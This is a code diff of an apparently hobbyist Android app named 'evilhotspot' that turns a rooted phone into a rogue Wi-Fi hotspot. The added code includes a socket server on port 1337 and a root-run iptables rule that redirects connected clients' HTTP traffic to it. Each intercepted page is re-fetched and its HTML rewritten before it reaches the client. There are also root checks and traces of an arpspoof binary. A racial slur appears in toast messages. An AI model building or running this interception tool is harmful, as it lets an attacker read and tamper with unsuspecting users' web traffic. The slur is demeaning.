@@ -1,31 +1,34 @@
 package android.evilhotspot;
-import android.app.Application;
 import android.content.Context;
 import android.content.Intent;
-import android.graphics.drawable.Drawable;
-import android.media.Image;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
+import android.graphics.Color;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
-import android.support.design.widget.FloatingActionButton;
-import android.support.design.widget.Snackbar;
+import android.os.StrictMode;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.util.Log;
-import android.view.Gravity;
 import android.view.View;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.Button;
-import android.widget.ImageView;
+import android.widget.TextView;
 import android.widget.Toast;
 import java.io.DataOutputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Method;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.ServerSocket;
+import java.net.Socket;
+import android.os.Handler;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
 //List of android permissions:
 //http://developer.android.com/reference/android/Manifest.permission.html
 
@@ -39,13 +42,18 @@ import java.lang.reflect.Method;
 //http://stackoverflow.com/questions/6066030/read-only-file-system-on-android
 //# mount -o rw,remount /system  <-> # mount -o ro,remount /system
 
-//Questions concerning our app:
+//PCAP ? not used in the app so far...:
 //http://stackoverflow.com/questions/15557831/android-use-pcap-library
 
 public class MainActivity extends AppCompatActivity implements View.OnClickListener {
 
-    //boolean isSettingsSet = false;
-    //boolean ButtonON = false;
+    // default IP
+    public static String SERVERIP = "192.168.43.1";
+    // designate a port
+    public static final int SERVERPORT = 1337;
+    private TextView serverStatus;
+    private Handler handler = new Handler();
+    private ServerSocket serverSocket;
 
     public static Button hsButton ;
     //MyApplication instance = new MyApplication(this);
@@ -65,15 +73,56 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         rtButton.setOnClickListener(this);
         Button htmlButton = (Button) findViewById(R.id.htmlbutton);
         htmlButton.setOnClickListener(this);
+        Button ruleButton = (Button) findViewById(R.id.iptablesButton);
+        ruleButton.setOnClickListener(this);
 
         MyApplication myapp= new MyApplication(this);
 
-        if(ApManager.isApOn(getApplicationContext())){
-            hsButton.setBackgroundResource(R.drawable.button_on);
+        try {
+            Context context = getApplicationContext();
+            WifiManager wifiManager = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
+            Method getConfigMethod = wifiManager.getClass().getMethod("getWifiApConfiguration");
+            WifiConfiguration wifiConfig = (WifiConfiguration) getConfigMethod.invoke(wifiManager);
+            
+            if (ApManager.isApOn()) {
+                Button btn = MainActivity.hsButton;
+                btn.setBackgroundResource(R.drawable.button_on);
+                //when you have default seetings and switch off and on app in MainActivity then checkbox is checked, (default seetings on)
+                if (wifiConfig.SSID.equals("AndroidAP")) {
+                    ApManager.isCheckBoxChecked = true;
+                }
+                //ApManager.isCheckBoxChecked=false;
+                else if (!wifiConfig.SSID.equals("AndroidAP")) {
+                    ApManager.isCheckBoxChecked = false;
+                }
+            } else if (!ApManager.isApOn()) {
+                Button btn = MainActivity.hsButton;
+                btn.setBackgroundResource(R.drawable.button_off);
+                if (wifiConfig.SSID.equals("AndroidAP")) {
+                    ApManager.isCheckBoxChecked = true;
+                }
+                //ApManager.isCheckBoxChecked=false;
+                else if (!wifiConfig.SSID.equals("AndroidAP")) {
+                    ApManager.isCheckBoxChecked = false;
+                }
+            }
         }
+        catch(Exception e){
+            e.printStackTrace();
+        }
+        //Log.e("MyTemp", netInterface.getDisplayName());
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        StrictMode.setThreadPolicy(policy);
        // Context context = getApplicationContext();
 
-        //Log.e("MyTemp", netInterface.getDisplayName());
+        serverStatus = (TextView) findViewById(R.id.serverStatusView);
+        serverStatus.setTextColor(Color.parseColor("#F5DC49"));
+        Thread proxy = new Thread(new httpThread());
+        //proxy.setPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
+        proxy.start();
+
+        //set up ApManager and make sure we start with AP off
+        ApManager.setUp(getApplicationContext());
     }
 
     @Override
@@ -88,117 +137,216 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         MyApplication.activityPaused();
     }
 
+    public class httpThread implements Runnable {
+        private String request = "";
+        private String line = "";
+        protected Boolean work = true;
+        private BufferedReader in;
+        private PrintWriter out;
+        public void run() {
+
+            try {
+                if (SERVERIP != null) {
+                    handler.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            serverStatus.setText("Listening on IP: " + SERVERIP);
+                        }
+                    });
+                    serverSocket = new ServerSocket(SERVERPORT);
+                    serverSocket.setSoTimeout(0);
+                    while (work) {
+                        handler.post(new Runnable() {
+                            @Override
+                            public void run() {
+                                serverStatus.setText("Listening on IP: " + SERVERIP);
+                            }
+                        });
+                        // listen for incoming clients
+                        final Socket client = serverSocket.accept();
+                        handler.post(new Runnable() {
+                            @Override
+                            public void run() {
+                                serverStatus.setText("Accepted client socket");
+                            }
+                        });
+                        //get request from client
+                        try {
+                            in = new BufferedReader(new InputStreamReader(client.getInputStream()));
+                            out = new PrintWriter(client.getOutputStream(), true);
+                            request = "";
+                            while ((line = in.readLine()) != null) {
+                                Log.d("ServerActivity", line);
+                                request += line + '\n';
+                                handler.post(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        serverStatus.setText("Reading request");
+                                    }
+                                });
+                                //send response to client
+                                if (line.isEmpty()){
+                                    //find which host
+                                    String url = "";
+                                    Pattern p = Pattern.compile("Host:\\s(.*)");
+                                    Matcher m = p.matcher(request);
+                                    while (m.find()) {
+                                        Log.d("REGEXP", m.group(1));
+                                        url += m.group(1);
+                                    }
+                                    //find which file
+                                    p = Pattern.compile("^GET\\s([^\\s]*)\\s");
+                                    m = p.matcher(request);
+                                    while (m.find()) {
+                                        Log.d("REGEXP", m.group(1));
+                                        url += m.group(1);
+                                    }
+
+                                    requestTask rt = new requestTask();
+                                    String response = rt.doInBackground("http://"+url);
+                                    response = HTMLEditor.editHTML(response);
+                                    out.print(response);
+                                    out.flush();
+                                    handler.post(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            serverStatus.setText("Sent response.");
+                                        }
+                                    });
+                                    client.close();
+                                    break;
+                                }
+                            }
+
+                        } catch (Exception e) {
+                            handler.post(new Runnable() {
+                                @Override
+                                public void run() {
+                                    serverStatus.setText("Oops. Connection interrupted. Please reconnect your phones.");
+                                }
+                            });
+                            e.printStackTrace();
+                        }
+
+                    }
+                } else {
+                    handler.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            serverStatus.setText("Couldn't detect internet connection.");
+                        }
+                    });
+                }
+            } catch (Exception e) {
+                handler.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        serverStatus.setText("Error");
+                    }
+                });
+                e.printStackTrace();
+            }
+        }
+    }
+
 
     public void onClick(View v) {
         // default method for handling onClick Events for our MainActivity
         switch (v.getId()) {
 
             case R.id.hsButton:
-                //if hs button was pressed turn on/off hotspot
-
-
-                //Part for switching img of main button & enable/disable checkbox default
-                Context context = MainActivity.this;
-                //WifiManager wifimanager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
-                try {
-                    WifiManager wifiManager = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
-                    Method getConfigMethod = wifiManager.getClass().getMethod("getWifiApConfiguration");
-                    WifiConfiguration wifiConfig = (WifiConfiguration) getConfigMethod.invoke(wifiManager);
-
-
-                    if (!ApManager.isApOn(context)) {
-                        hsButton.setBackgroundResource(R.drawable.button_on);
-                        //ButtonON=true;
-
-
-                    Toast t = Toast.makeText(this, wifiConfig.SSID, Toast.LENGTH_LONG);
-                        t.show();
-
-
-                        if (wifiConfig.SSID.equals("AndroidAP")) {
-                            ApManager.isCheckBoxChecked = true;
-                        }
-                        //ApManager.isCheckBoxChecked=false;
-                        else if (wifiConfig.SSID.equals("AndroidAP")) {
-                            ApManager.isCheckBoxChecked = false;
-                        }
-
-
-                    }
-                    //WIFI IS ON Make OFF
-                    else if (ApManager.isApOn(context)) {
-                        hsButton.setBackgroundResource(R.drawable.button_off);
-
-                        if (wifiConfig.SSID.equals("AndroidAP"))  {
-                            ApManager.isCheckBoxChecked = true;
-                        }
-                        //ApManager.isCheckBoxChecked=false;
-                        else if (wifiConfig.SSID.equals("AndroidAP"))  {
-                            ApManager.isCheckBoxChecked = false;
-                        }
-
-                        //ButtonON=false;
-                    }
-                }
-                catch(Exception e){
-                    e.printStackTrace();
-                }
-                ApManager.configApState(MainActivity.this);
-                //for changing button looks when pressed
-
-
-
+                Log.d("BUTTONS", "hotspot button pressed");
+                //if HS button was pressed turn on/off hotspot
+                hsPressed();
                 break;
             case R.id.htmlbutton:
                 toastMessage("html test");
                 HTMLEditor.Reader(this.getApplicationContext());
-
                 break;
             case R.id.rtButton:
-                //if root test was pressed attempt to do something as root
-                Process p;
-                try {
-                    //Preform su to get root privileges
-                    p = Runtime.getRuntime().exec("su");
-                    // Attempt to write a file to a root-only
-                    DataOutputStream os = new DataOutputStream(p.getOutputStream());
-                    os.writeBytes("echo \"Do I have root?\" > /system/temporary.txt\n");
-
-                    //arpspoof (attempting to run a C program, build with NDK)
-                    //get resource handle
-                    InputStream raw = getResources().openRawResource(R.raw.arpspoof);
-                    saveFile("arpspoof", raw);
-                    os.writeBytes("chmod 700 /data/data/android.evilhotspot/files/arpspoof\n");
-                    //os.writeBytes("/data/data/android.evilhotspot/files/arpspoof -i wlan0 -t 192.168.43.1 192.168.43.152 \n");
-
-
-                    // Close the terminal
-                    os.writeBytes("exit\n");
-                    os.flush();
-                    try {
-                        p.waitFor();
-                        //DEBUG: exit values
-                        //toastMessage(Integer.toString(p.exitValue()));
-                        if(p.exitValue() == 0){
-                            // TODO Code to run on success
-                            toastMessage("root");
-                        }
-                        else{
-                            // TODO Code to run on unsuccessful
-                            toastMessage("not root");
-                        }
-
-                    } catch(InterruptedException e){
-                        // TODO Code to run in interrupted exception
-                        toastMessage("not root, intrp. exeption");
-                    }
-                } catch(IOException e) {
-                    //TODO Code to run in input/output exception
-                    toastMessage("not root, I/O exeption");
-            }
-
+                Log.d("BUTTONS", "root test button pressed");
+                rtPressed();
+            case R.id.iptablesButton:
+                Log.d("BUTTONS", "inject rule button pressed");
+                iptablesRulePressed((Button) findViewById(R.id.iptablesButton));
+                break;
         }
     }
+
+    //change current state of mobile hotspot
+    private void hsPressed(){
+        //Part for switching img of main button & enable/disable checkbox default
+        Context context = MainActivity.this;
+        //WifiManager wifimanager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
+        try {
+            WifiManager wifiManager = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
+            Method getConfigMethod = wifiManager.getClass().getMethod("getWifiApConfiguration");
+            WifiConfiguration wifiConfig = (WifiConfiguration) getConfigMethod.invoke(wifiManager);
+
+
+            if (!ApManager.isApOn()) {
+                hsButton.setBackgroundResource(R.drawable.button_on);
+                //ButtonON=true;
+
+
+                Toast t = Toast.makeText(this, wifiConfig.SSID, Toast.LENGTH_LONG);
+                t.show();
+
+
+                if (wifiConfig.SSID.equals("AndroidAP")) {
+                    ApManager.isCheckBoxChecked = true;
+                }
+                //ApManager.isCheckBoxChecked=false;
+                else if (!wifiConfig.SSID.equals("AndroidAP")) {
+                    ApManager.isCheckBoxChecked = false;
+                }
+
+
+            }
+            //WIFI IS ON Make OFF
+            else if (ApManager.isApOn()) {
+                hsButton.setBackgroundResource(R.drawable.button_off);
+
+                if (wifiConfig.SSID.equals("AndroidAP"))  {
+                    ApManager.isCheckBoxChecked = true;
+                }
+                //ApManager.isCheckBoxChecked=false;
+                else if (!wifiConfig.SSID.equals("AndroidAP"))  {
+                    ApManager.isCheckBoxChecked = false;
+                }
+
+                //ButtonON=false;
+            }
+        }
+        catch(Exception e){
+            e.printStackTrace();
+        }
+        ApManager.configApState();
+        //for changing button looks when pressed
+
+    }
+
+    //try to do something as root (root test)
+    private void rtPressed(){
+        //if root test was pressed attempt to do something as root
+        ShellExecutor exe = new ShellExecutor();
+        if (exe.isRootAvailable()){
+            toastMessage("We got root niggah!");
+        }
+        else{
+            if (exe.RunAsRootOutput("busybox id -u").equals("0"))
+                toastMessage("We got root niggah!");
+            else
+                toastMessage("We don't have root my mans...");
+        }
+
+        //arpspoof (attempting to run a C program, build with NDK)
+        //get resource handle
+        //InputStream raw = getResources().openRawResource(R.raw.arpspoof);
+        //saveFile("arpspoof", raw);
+        //os.writeBytes("chmod 700 /data/data/android.evilhotspot/files/arpspoof\n");
+    }
+
     //for saving embedded raw binary blob as file that can be run on filesystem
     public int saveFile(String filename, InputStream raw ){
         try {
@@ -217,6 +365,44 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             return 1;
         }
     }
+    //inject/remove iptables rule that will route http traffic to our app
+    private int iptablesRulePressed(Button ruleButton){
+        Process p;
+        try {
+            //Preform su to get root privileges
+            p = Runtime.getRuntime().exec("su");
+            DataOutputStream os = new DataOutputStream(p.getOutputStream());
+
+            if (ruleButton.getText().toString().equals("Inject rule"))
+                os.writeBytes("iptables -t nat -I PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337\n");
+            else
+                os.writeBytes("iptables -t nat -D PREROUTING 1\n");
+
+            os.writeBytes("exit\n");
+            os.flush();
+            try {
+                p.waitFor();
+                if(p.exitValue() == 0){
+                    toastMessage("success");
+                    if (ruleButton.getText().toString().equals("Inject rule"))
+                        ruleButton.setText("Remove rule");
+                    else
+                        ruleButton.setText("Inject rule");
+                    return 0;
+                }
+            } catch (InterruptedException e){
+                //Exit with 2 if we were rudely interrupted !
+                toastMessage("failure, intrp. exeption");
+                return 2;
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+            toastMessage("not root, I/O exeption");
+            return 3;
+        }
+        return 0;
+    }
+
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
